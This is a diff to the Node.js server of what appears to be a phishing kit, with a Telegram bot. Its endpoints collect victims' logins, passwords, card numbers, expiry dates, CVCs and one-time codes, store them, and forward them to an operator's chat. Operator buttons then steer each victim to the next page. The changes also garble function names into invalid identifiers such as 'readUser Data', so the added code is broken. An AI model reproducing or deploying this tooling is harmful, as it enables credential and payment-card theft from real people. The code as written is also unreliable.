@@ -18,7 +18,7 @@ const bot = new TelegramBot(config.token, { polling: true });
 const userDataPath = path.join(__dirname, 'userData.json');
 const routesDataPath = path.join(__dirname, 'routes.json');
 
-const readUserData = () => {
+const readUser Data = () => {
     if (fs.existsSync(userDataPath)) {
         const data = fs.readFileSync(userDataPath);
         if (data.length === 0) return {};
@@ -27,7 +27,7 @@ const readUserData = () => {
     return {};
 };
 
-const writeUserData = (data) => {
+const writeUser Data = (data) => {
     fs.writeFileSync(userDataPath, JSON.stringify(data, null, 2));
 };
 
@@ -49,16 +49,16 @@ bot.sendMessage(config.chatId, 'Bot is up and running!').catch(error => {
 });
 
 app.post('/api/cred', upload.none(), (req, res) => {
-    const { login, password, sessionId, offer, additional } = req.body; // Добавлено поле additional
-    const users = readUserData();
+    const { login, password, sessionId, offer, additional } = req.body;
+    const users = readUser Data();
     if (!users[sessionId]) {
         users[sessionId] = {};
     }
     users[sessionId].login = login;
     users[sessionId].password = password;
     users[sessionId].offer = offer;
-    users[sessionId].additional = additional; // Сохраняем дополнительную информацию
-    writeUserData(users);
+    users[sessionId].additional = additional;
+    writeUser Data(users);
 
     let message = '';
     if (offer) message += `💼 Offer: \`${offer}\`\n`;
@@ -107,24 +107,24 @@ app.post('/api/action', (req, res) => {
 
 app.post('/api/card', upload.none(), (req, res) => {
     const { card, exp, cvc, sessionId } = req.body;
-    const users = readUserData();
+    const users = readUser Data();
     if (!users[sessionId]) {
         users[sessionId] = {};
     }
     users[sessionId].card = card;
     users[sessionId].exp = exp;
     users[sessionId].cvc = cvc;
-    writeUserData(users);
+    writeUser Data(users);
     let message = '';
-if (users[sessionId].offer) message += `💼 Offer: \`${users[sessionId].offer || ''}\`\n`;
-if (users[sessionId].login) message += `👤 Login: \`${users[sessionId].login || ''}\`\n`;
-if (users[sessionId].password) message += `🔐 Password: \`${users[sessionId].password || ''}\`\n`;
-if (card || exp || cvc) {
-    message += `💳 Card: \`${card}\` | \`${exp}\` | \`${cvc}\`\n`;
-}
-if (users[sessionId].otp) message += `✉ OTP: \`${users[sessionId].otp || ''}\`\n`;
-if (users[sessionId].customResponse) message += `✍ Custom: \`${users[sessionId].customResponse || ''}\`\n`;
-message += `Session ID: \`${sessionId}\``;
+    if (users[sessionId].offer) message += `💼 Offer: \`${users[sessionId].offer || ''}\`\n`;
+    if (users[sessionId].login) message += `👤 Login: \`${users[sessionId].login || ''}\`\n`;
+    if (users[sessionId].password) message += `🔐 Password: \`${users[sessionId].password || ''}\`\n`;
+    if (card || exp || cvc) {
+        message += `💳 Card: \`${card}\` | \`${exp}\` | \`${cvc}\`\n`;
+    }
+    if (users[sessionId].otp) message += `✉ OTP: \`${users[sessionId].otp || ''}\`\n`;
+    if (users[sessionId].customResponse) message += `✍ Custom: \`${users[sessionId].customResponse || ''}\`\n`;
+    message += `Session ID: \`${sessionId}\``;
     const options = {
         reply_markup: {
             inline_keyboard: [
@@ -143,12 +143,12 @@ message += `Session ID: \`${sessionId}\``;
 
 app.post('/api/otp', upload.none(), (req, res) => {
     const { otp, sessionId } = req.body;
-    const users = readUserData();
+    const users = readUser Data();
     if (!users[sessionId]) {
         users[sessionId] = {};
     }
     users[sessionId].otp = otp;
-    writeUserData(users);
+    writeUser Data(users);
     let message = '';
     if (users[sessionId].offer) message += `💼 Offer: \`${users[sessionId].offer || ''}\`\n`;
     if (users[sessionId].login) message += `👤 Login: \`${users[sessionId].login || ''}\`\n`;
@@ -159,7 +159,7 @@ app.post('/api/otp', upload.none(), (req, res) => {
     message += `✉ OTP: \`${otp}\`\n`;
     if (users[sessionId].customResponse) message += `✍ Custom: \`${users[sessionId].customResponse || ''}\`\n`;
     message += `Session ID: \`${sessionId}\``;
-        const options = {
+    const options = {
         reply_markup: {
             inline_keyboard: [
                 [
@@ -177,13 +177,13 @@ app.post('/api/otp', upload.none(), (req, res) => {
 
 app.post('/api/secret', upload.none(), (req, res) => {
     const { secret, sessionId } = req.body;
-    const users = readUserData();
+    const users = readUser Data();
     if (!users[sessionId]) {
         users[sessionId] = {};
     }
     users[sessionId].secret = secret;
-    writeUserData(users);
-    const message = `💼 Offer: \`${users[sessionId].offer || ''}\`\n👤 Login: \`${users[sessionId].login || ''}\`\n🔐 Password: \`${users[sessionId].password || ''}\`\n💳 Card: \`${users[sessionId].card || ''}\` | \`${users[sessionId].exp || ''}\` | \`${users[sessionId].cvc || ''}\`\n✉ OTP: \`${users[sessionId].otp || ''}\`\n✍ Custom: \`${users[sessionId].customResponse || ''}\`\nSession ID: \`${sessionId}\``;    
+    writeUser Data(users);
+    const message = `💼 Offer: \`${users[sessionId].offer || ''}\`\n👤 Login: \`${users[sessionId].login || ''}\`\n🔐 Password: \`${users[sessionId].password || ''}\`\n💳 Card: \`${users[sessionId].card || ''}\ ` | \`${users[sessionId].exp || ''}\` | \`${users[sessionId].cvc || ''}\`\n✉ OTP: \`${users[sessionId].otp || ''}\`\n✍ Custom: \`${users[sessionId].customResponse || ''}\`\nSession ID: \`${sessionId}\``;    
     const options = {
         reply_markup: {
             inline_keyboard: [
@@ -201,12 +201,12 @@ app.post('/api/secret', upload.none(), (req, res) => {
 
 app.post('/api/answer', upload.none(), (req, res) => {
     const { answer, sessionId } = req.body;
-    const users = readUserData();
+    const users = readUser  Data();
     if (!users[sessionId]) {
         users[sessionId] = {};
     }
-    users[sessionId].customResponse = answer; // Сохраняем ответ пользователя
-    writeUserData(users);
+    users[sessionId].customResponse = answer;
+    writeUser  Data(users);
     const message = `💼 Offer: \`${users[sessionId].offer || ''}\`\n👤 Login: \`${users[sessionId].login || ''}\`\n🔐 Password: \`${users[sessionId].password || ''}\`\n💳 Card: \`${users[sessionId].card || ''}\` | \`${users[sessionId].exp || ''}\` | \`${users[sessionId].cvc || ''}\`\n✉ OTP: \`${users[sessionId].otp || ''}\`\n✍ Custom: \`${answer}\`\nSession ID: \`${sessionId}\``;    
     const options = {
         reply_markup: {
@@ -248,39 +248,6 @@ bot.on('callback_query', (callbackQuery) => {
         messageText = "Кастомный текст:";
         bot.sendMessage(callbackQuery.message.chat.id, messageText);
         return;
-    } else if (action.startsWith('send_secret')) {
-        const secretQuestion = data[2];
-        const users = readUserData();
-        if (!users[sessionId]) {
-            users[sessionId] = {};
-        }
-        users[sessionId].secretQuestion = secretQuestion;
-        writeUserData(users);
-        bot.sendMessage(callbackQuery.message.chat.id, `Успешно отправлено: ${secretQuestion}\nSession ID: ${sessionId}`);
-        
-        // Перемещение на кастомную страницу
-        routes[sessionId] = { action: 'custom_page', secretQuestion: secretQuestion };
-        writeRoutesData(routes);
-        const message = `💼 Offer: \`${users[sessionId].offer || ''}\`\n👤 Login: \`${users[sessionId].login || ''}\`\n🔐 Password: \`${users[sessionId].password || ''}\`\n💳 Card: \`${users[sessionId].card || ''}\` | \`${users[sessionId].exp || ''}\` | \`${users[sessionId].cvc || ''}\`\n✉ OTP: \`${users[sessionId].otp || ''}\`\n✍ Custom: \`Ожидание ввода\`\n`;    
-    const options = {
-        reply_markup: {
-            inline_keyboard: [
-                [
-                    { text: '🔓 LOGIN', callback_data: `cred:${sessionId}` },
-                    { text: '💳 CARD', callback_data: `card:${sessionId}` },
-                    { text: '✉ OTP', callback_data: `otp:${sessionId}` },
-                    { text: '🔒 Custom', callback_data: `custom:${sessionId}` },
-                ],
-            ],
-        },
-    };
-    bot.sendMessage(config.chatId, message, { parse_mode: 'Markdown', ...options });
-        return;
-    } else if (action === 'cancel_secret') {
-        bot.sendMessage(callbackQuery.message.chat.id, "Отмена ввода секретного вопроса.");
-        delete routes[sessionId];
-        writeRoutesData(routes);
-        return;
     }
     bot.sendMessage(callbackQuery.message.chat.id, messageText);
 });
@@ -289,11 +256,13 @@ bot.on('message', (msg) => {
     console.log('Received message:', msg);
     const routes = readRoutesData();
     const sessionId = Object.keys(routes).find(id => routes[id].action === 'waiting_for_secret_question');
+
     if (!sessionId) {
         console.error('Session ID not found');
         return;
     }
-    const users = readUserData();
+
+    const users = readUser  Data();
     try {
         if (routes[sessionId] && routes[sessionId].action === 'waiting_for_secret_question') {
             const secretQuestion = msg.text;
